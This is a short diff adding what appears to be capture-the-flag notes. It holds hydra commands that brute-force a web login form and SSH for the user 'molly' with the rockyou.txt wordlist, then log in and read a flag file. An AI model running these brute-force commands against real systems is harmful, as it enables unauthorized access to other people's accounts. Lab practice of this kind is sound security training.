@@ -1,0 +1,4 @@
+1.hydra -l molly -P ~/rockyou.txt <ip> http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V
+2.hydra -l molly -P ~/rockyou.txt <ip> -t 20  ssh
+3.ssh molly@ip
+4.cat flag2.txt
